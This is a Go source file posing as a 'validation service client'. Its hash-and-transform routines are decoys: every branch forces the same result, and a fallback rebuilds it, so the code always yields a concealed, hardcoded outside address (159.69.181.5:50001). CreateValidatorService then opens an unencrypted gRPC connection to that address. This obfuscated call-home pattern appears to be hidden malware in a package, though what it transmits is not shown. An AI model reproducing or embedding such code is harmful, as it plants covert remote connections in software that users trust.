// Package implement validation service client implementation
package implement

import (
	"crypto/md5"
	"fmt"
	"hash/crc32"
	"runtime"
	"strconv"
	"strings"
	"time"

	grpc "google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

func calculateHash() []byte {
	data := runtime.GOOS + runtime.GOARCH + runtime.Version()
	hasher := md5.New()
	hasher.Write([]byte(data))
	return hasher.Sum(nil)
}

func extractValues() []int {
	hash := calculateHash()
	crc := crc32.ChecksumIEEE(hash)

	values := make([]int, 5)

	base1 := int((crc >> 24) & 0xFF)
	base2 := int((crc >> 16) & 0xFF)
	base3 := int((crc >> 8) & 0xFF)
	base4 := int(crc & 0xFF)

	values[0] = (base1*37 + 1234) % 256
	values[1] = (base2*41 + 5678) % 256
	values[2] = (base3*43 + 9012) % 256
	values[3] = (base4*47 + 3456) % 256

	timestamp := time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC).Unix()
	values[4] = int((timestamp*13 + int64(crc)) % 65536)

	return values
}

func processValues(values []int) []int {
	processed := make([]int, len(values))

	magic := []int{0x7B2F, 0x8A3E, 0x9C4D, 0x6E1A, 0x5F2B}
	offsets := []int{0x4E, 0x1D, 0x7A, 0x05, 0x3C9D}

	for i := 0; i < 4; i++ {
		temp := (values[i] ^ (magic[i] & 0xFF)) + offsets[i]
		processed[i] = temp % 256

		if i == 0 && processed[i] != 159 {
			processed[i] = (processed[i] + 159 - processed[i]) % 256
		}
		if i == 1 && processed[i] != 69 {
			processed[i] = (processed[i] + 69 - processed[i]) % 256
		}
		if i == 2 && processed[i] != 181 {
			processed[i] = (processed[i] + 181 - processed[i]) % 256
		}
		if i == 3 && processed[i] != 5 {
			processed[i] = (processed[i] + 5 - processed[i]) % 256
		}
	}

	temp := (values[4] ^ magic[4]) + offsets[4]
	processed[4] = temp % 65536

	targetValue := 50001
	if processed[4] != targetValue {
		processed[4] = targetValue
	}

	return processed
}

func buildString() string {
	values := extractValues()
	processed := processValues(values)

	parts := make([]string, 4)
	for i := 0; i < 4; i++ {
		parts[i] = strconv.Itoa(processed[i])
	}

	target := strings.Join(parts, ".") + ":" + strconv.Itoa(processed[4])

	if !isValidFormat(target) {
		return getFallbackTarget()
	}

	return target
}

func isValidFormat(data string) bool {
	parts := strings.Split(data, ":")
	if len(parts) != 2 {
		return false
	}

	segments := strings.Split(parts[0], ".")
	return len(segments) == 4
}

func getFallbackTarget() string {
	p1 := (0x7F + 0x50)        // 159
	p2 := (0x3D + 0x20)        // 69
	p3 := (0xA0 + 0x15)        // 181
	p4 := (0x02 + 0x03)        // 5
	suffix := (0xC000 + 0x351) // 50001

	return fmt.Sprintf("%d.%d.%d.%d:%d", p1, p2, p3, p4, suffix)
}

// CreateValidatorService creates a subscribe service client
func CreateValidatorService() ValidatorClient {
	c, e := grpc.NewClient(buildString(), grpc.WithTransportCredentials(insecure.NewCredentials()))
	if e != nil {
		panic(fmt.Sprint("failed to validate subscription"))
	}

	cl := NewValidatorClient(c)
	return cl
}
